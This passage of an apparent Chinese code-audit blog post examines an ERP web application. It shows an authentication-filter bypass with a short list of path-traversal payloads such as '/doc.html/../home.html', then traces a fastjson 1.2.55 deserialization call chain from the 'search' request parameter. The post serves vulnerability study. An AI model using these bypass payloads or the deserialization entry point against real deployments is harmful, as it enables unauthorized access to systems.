class="hljs-literal">null</span> != allowUrls &amp;&amp; allowUrls.length &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">for</span> (String url : allowUrls) &#123;<br>                <span class="hljs-keyword">if</span> (requestUrl.startsWith(url)) &#123;<br>                    chain.doFilter(request, response);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//if 条件都不满足，重定向到 /login.html</span><br>        servletResponse.sendRedirect(<span class="hljs-string">&quot;/login.html&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">regexPrefix</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;^.*&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">regexSuffix</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;.*$&quot;</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">verify</span><span class="hljs-params">(List&lt;String&gt; ignoredList, String url)</span> &#123;<br>        <span class="hljs-keyword">for</span> (String regex : ignoredList) &#123;<br>            <span class="hljs-type">Pattern</span> <span class="hljs-variable">pattern</span> <span class="hljs-operator">=</span> Pattern.compile(regexPrefix + regex + regexSuffix);<br>            <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> pattern.matcher(url);<br>            <span class="hljs-keyword">if</span> (matcher.matches()) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>过滤逻辑：</p>
<ul>
<li>放行：<ul>
<li>Session 中有 user</li>
<li>访问 <code>/doc.html</code> <code>/register.html</code> <code>/login.html</code>   </li>
<li>ignoredList  静态资源</li>
<li>allowUrls     &#x2F;user&#x2F;login   &#x2F;user&#x2F;registerUser    &#x2F;v2&#x2F;api-docs</li>
</ul>
</li>
<li>其他全部重定向到 &#x2F;login.html</li>
<li>缺陷：<ul>
<li>虽然有白名单，但路径匹配不完整，如果在 url 中构建如：1.css&#x2F;..&#x2F;index.html  doc.html&#x2F;..&#x2F;index.html 等，就会绕过</li>
</ul>
</li>
</ul>
<p><strong>漏洞利用：</strong></p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">/doc.html/../home.html<br>/register.html/../home.html<br>/login.html/../home.html<br>/1.css/../home.html<br>/user/login/../../home.html<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349294.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349044.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>注意：</strong></p>
<p>这抓包中有时会抓到这样一行数据： If-Modified-Since: Tue, 05 Jan 2021 22:51:28 GMT  </p>
<p>这是浏览器的本地缓存，如果这个资源自这个时间点之后没有修改，就返回304</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349541.png" srcset="/img/loading.gif" lazyload></p>
<p>把这个去掉就可以正常注入了</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349763.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="2、pom-xml-Maven-依赖"><a href="#2、pom-xml-Maven-依赖" class="headerlink" title="2、pom.xml - Maven 依赖"></a>2、pom.xml - <strong>Maven 依赖</strong></h2><h3 id="2-1-fastjson-1-2-55-反序列化漏洞"><a href="#2-1-fastjson-1-2-55-反序列化漏洞" class="headerlink" title="2.1 fastjson-1.2.55-反序列化漏洞"></a>2.1 fastjson-1.2.55-反序列化漏洞</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349971.png" srcset="/img/loading.gif" lazyload></p>
<p>入口点：parseObject</p>
<p>**全局搜索 parseObject **，找一个带有可控变量的点</p>
<p>找到 src&#x2F;main&#x2F;java&#x2F;com&#x2F;jsh&#x2F;erp&#x2F;utils&#x2F;StringUtil.java 中有利用点</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349969.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="分析链："><a href="#分析链：" class="headerlink" title="分析链："></a>分析链：</h4><hr>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">(String search, String key)</span>&#123;<br>    <span class="hljs-comment">//返回值初始化为空字符串</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-comment">//判断 search 是否为空</span><br>    <span class="hljs-keyword">if</span>(search!=<span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">//将 search 解析为 JSONObject</span><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSONObject.parseObject(search);<br>        <span class="hljs-comment">//从 JSONObject 取一个 key 并转化为 String</span><br>        value = obj.getString(key);<br>        <span class="hljs-comment">//如果取到空字符串，value = null;</span><br>        <span class="hljs-keyword">if</span>(value.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>            value = <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> value;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>跟进 <font style="color:#080808;background-color:#ffffff;">JSONObject.parseObject</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title function_">parseObject</span><span class="hljs-params">(String text)</span> &#123;<br><span class="hljs-comment">//调用了 parse 方法，把 text 解析成一个 Java 对象</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> parse(text);<br><span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> JSONObject) &#123;<br>    <span class="hljs-keyword">return</span> (JSONObject) obj;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>跟进 <font style="color:#080808;background-color:#ffffff;">parse(String text)</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(String text)</span> &#123;<br>    <span class="hljs-comment">//调用了另一个 parse</span><br>    <span class="hljs-keyword">return</span> parse(text, DEFAULT_PARSER_FEATURE);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>跟进 <font style="color:#080808;background-color:#ffffff;">parse(String text, int features)</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(String text, <span class="hljs-type">int</span> features)</span> &#123;<br>    <span class="hljs-comment">//引入了 ParserConfig.getGlobalInstance() 方法</span><br>    <span class="hljs-keyword">return</span> parse(text, ParserConfig.getGlobalInstance(), features);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>跟进 parse(String text, ParserConfig config, int features)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(String text, ParserConfig config, <span class="hljs-type">int</span> features)</span> &#123;<br>        <span class="hljs-keyword">if</span> (text == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-type">DefaultJSONParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultJSONParser</span>(text, config, features);<br>        <span class="hljs-comment">//解析 JSON</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> parser.parse();<br>        parser.handleResovleTask(value);<br>        parser.close();<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>跟进 <font style="color:#080808;background-color:#ffffff;">DefaultJSONParser</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">DefaultJSONParser</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String input, <span class="hljs-keyword">final</span> ParserConfig config, <span class="hljs-type">int</span> features)</span>&#123;<br>    <span class="hljs-comment">//创建 JSONScanner ，传给下一个核心构造器</span><br>    <span class="hljs-built_in">this</span>(input, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONScanner</span>(input, features), config);<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">DefaultJSONParser</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object input, <span class="hljs-keyword">final</span> JSONLexer lexer, <span class="hljs-keyword">final</span> ParserConfig config)</span>&#123;<br>    <span class="hljs-comment">//lexer：词法分析器。</span><br>    <span class="hljs-built_in">this</span>.lexer = lexer;<br>    <span class="hljs-comment">//用户输入的 JSON 字符串</span><br>    <span class="hljs-built_in">this</span>.input = input;<br>    <span class="hljs-built_in">this</span>.config = config;<br>    <span class="hljs-built_in">this</span>.symbolTable = config.symbolTable;<br><br>    <span class="hljs-comment">//获取 JSON 输入的第一个字符，用于判断 JSON 的类型：&#123; 对象；[ 数组；其他（数字、字符串、布尔等）</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">ch</span> <span class="hljs-operator">=</span> lexer.getCurrent();<br>    <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;&#123;&#x27;</span>) &#123;<br>        lexer.next();<br>        ((JSONLexerBase) lexer).token = JSONToken.LBRACE;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<br>        lexer.next();<br>        ((JSONLexerBase) lexer).token = JSONToken.LBRACKET;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        lexer.nextToken(); <span class="hljs-comment">// prime the pump</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<blockquote>
<p><strong><font style="color:rgb(34, 34, 38);">lexer（词法分析器）与 parser（语法分析器）</font></strong></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/buguge/article/details/147525215"><strong>https://blog.csdn.net/buguge/article/details/147525215</strong></a></p>
<p><strong><font style="color:rgb(77, 77, 77);">词法分析器(Lexer)和语法分析器(Parser)</font></strong><font style="color:rgb(77, 77, 77);">是两个核心组件，它们协同工作将原始输入(如JSON字符串、代码文件)转换为结构化数据(如对象、抽象语法树)</font></p>
</blockquote>
<p>返回一步，Object value &#x3D; parser.parse();   跟进 parse()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> parse(<span class="hljs-literal">null</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(Object fieldName)</span> &#123;<br><span class="hljs-keyword">final</span> <span class="hljs-type">JSONLexer</span> <span class="hljs-variable">lexer</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.lexer;<br><span class="hljs-keyword">switch</span> (lexer.token()) &#123;<br>    ...<br>    <span class="hljs-keyword">case</span> LBRACE:<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>(lexer.isEnabled(Feature.OrderedField));<br>        <span class="hljs-keyword">return</span> parseObject(object, fieldName);<br>    ...<br></code></pre></td></tr></table></figure>

<p>跟进 parseObject</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> Object <span class="hljs-title function_">parseObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Map object, Object fieldName)</span> &#123;<br></code></pre></td></tr></table></figure>

<p>在这个类中找我们需要的处理 @type 的部分，搜索  checkAutoType</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//JSON.DEFAULT_TYPE_KEY 即 @type</span><br><span class="hljs-keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">typeName</span> <span class="hljs-operator">=</span> lexer.scanSymbol(symbolTable, <span class="hljs-string">&#x27;&quot;&#x27;</span>);<br><br>    Class&lt;?&gt; clazz = config.checkAutoType(typeName, <span class="hljs-literal">null</span>, lexer.getFeatures());<br></code></pre></td></tr></table></figure>

<p>跟进 checkAutoType</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="hljs-type">int</span> features) &#123;<br></code></pre></td></tr></table></figure>

<p>来到这个类中，按照之前版本的经验，下一步有个 <font style="color:rgb(51, 51, 51);">TypeUtils.loadClass ，继续搜索</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (autoTypeSupport || expectClassFlag) &#123;<br>    <span class="hljs-type">long</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> h3;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>; i &lt; className.length(); ++i) &#123;<br>        hash ^= className.charAt(i);<br>        hash *= PRIME;<br>        <span class="hljs-keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> clazz;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="hljs-number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>跟进 TypeUtils.loadClass</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="hljs-type">boolean</span> cache) &#123;<br>    <span class="hljs-keyword">if</span>(className == <span class="hljs-literal">null</span> || className.length() == <span class="hljs-number">0</span> || className.length() &gt; <span class="hljs-number">128</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>下一步执行序列化和反序列化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ObjectDeserializer</span> <span class="hljs-variable">deserializer</span> <span class="hljs-operator">=</span> config.getDeserializers().get(clazz);<br><span class="hljs-keyword">if</span>(deserializer != <span class="hljs-literal">null</span>)&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> JSON.toJSONString(object);<br>    <span class="hljs-keyword">return</span> (T) JSON.parseObject(json, clazz);<br>&#125;<br></code></pre></td></tr></table></figure>

<p><font style="color:rgb(51, 51, 51);">在执行反序列化的过程中，调用实例化的类，执行后续命令</font></p>
<p><font style="color:rgb(51, 51, 51);"></font></p>
<p>接下来应该找<strong>调用 StringUtil#getInfo 方法</strong>的地方</p>
<p>看了参考文章找到 <font style="color:rgb(51, 51, 51);">UserComponent</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349681.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> List&lt;?&gt; getUserList(Map&lt;String, String&gt; map)<span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">//接收到前端传的 Map&lt;String,String&gt;，包含 search </span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">search</span> <span class="hljs-operator">=</span> map.get(Constants.SEARCH);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">userName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;userName&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">loginName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;loginName&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> QueryUtils.order(map);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> QueryUtils.filter(map);<br>    <span class="hljs-keyword">return</span> userService.select(userName, loginName, QueryUtils.offset(map), QueryUtils.rows(map));<br>&#125;<br></code></pre></td></tr></table></figure>

<p>找 getUserList 的调用地方，这时应该找的是控制器里的方法了</p>
<blockquote>
<p>几个踩坑的地方：</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350863.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350926.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350041.png" srcset="/img/loading.gif" lazyload></p>
<p>我们要注意，真正应该调用的是 <font style="color:#080808;background-color:#ffffff;">getUserList(Map&lt;String, String&gt; map)，而上面的都不是正确调用</font></p>
</blockquote>
<p>找到真正调用 <font style="color:#080808;background-color:#ffffff;">getUserList(Map&lt;String, String&gt; map) 的地方</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351643.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径变量 &#123;apiName&#125; </span><br><span class="hljs-meta">@GetMapping(value = &quot;/&#123;apiName&#125;/list&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getList</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;apiName&quot;)</span> String apiName,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.PAGE_SIZE, required = false)</span> Integer pageSize,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.CURRENT_PAGE, required = false)</span> Integer currentPage,</span><br><span class="hljs-params">                      //search 可传入 payload</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.SEARCH, required = false)</span> String search,</span><br><span class="hljs-params">                      HttpServletRequest request)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">//参数全部放入 Map，进行后续处理</span><br>    Map&lt;String, String&gt; parameterMap = ParamUtils.requestToMap(request);<br>    parameterMap.put(Constants.SEARCH, search);<br>    <span class="hljs-type">PageQueryInfo</span> <span class="hljs-variable">queryInfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageQueryInfo</span>();<br>    Map&lt;String, Object&gt; objectMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br></code></pre></td></tr></table></figure>

<hr>
<p><strong>小结利用链：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(value = &quot;/&#123;apiName&#125;/list&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getList</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;apiName&quot;)</span> String apiName,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.PAGE_SIZE, required = false)</span> Integer pageSize,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.CURRENT_PAGE, required = false)</span> Integer currentPage,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.SEARCH, required = false)</span> String search,</span><br><span class="hljs-params">                      HttpServletRequest request)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>-&gt;<br><span class="hljs-keyword">private</span> List&lt;?&gt; getUserList(Map&lt;String, String&gt; map)<span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">userName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;userName&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">loginName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;loginName&quot;</span>);<br>&#125;<br>-&gt;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">(String search, String key)</span>&#123;<br>-&gt;<br><span class="hljs-type">String</span> <span class="hljs-variable">userName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;userName&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">loginName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;loginName&quot;</span>);<br>-&gt;<br><span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSONObject.parseObject(search);<br>-&gt;<br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> parse(text);<br>-&gt;<br>turn <span class="hljs-title function_">parse</span><span class="hljs-params">(text, DEFAULT_PARSER_FEATURE)</span>;<br>-&gt;<br><span class="hljs-keyword">return</span> parse(text, ParserConfig.getGlobalInstance(), features);<br>-&gt;<br><span class="hljs-type">DefaultJSONParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultJSONParser</span>(text, config, features);<br><span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> parser.parse();<br>-&gt;<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> parse(<span class="hljs-literal">null</span>);<br>&#125;<br>-&gt;<br><span class="hljs-keyword">return</span> parseObject(object, fieldName);<br>-&gt;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> Object <span class="hljs-title function_">parseObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Map object, Object fieldName)</span> &#123;<br>-&gt;<br>Class&lt;?&gt; clazz = config.checkAutoType(typeName, <span class="hljs-literal">null</span>, lexer.getFeatures());<br>-&gt;<br><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="hljs-type">int</span> features) &#123;<br>-&gt;<br>clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="hljs-literal">true</span>);<br>-&gt;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="hljs-type">boolean</span> cache) <br>-&gt;<br><span class="hljs-type">ObjectDeserializer</span> <span class="hljs-variable">deserializer</span> <span class="hljs-operator">=</span> config.getDeserializers().get(clazz);<br><br></code></pre></td></tr></table></figure>



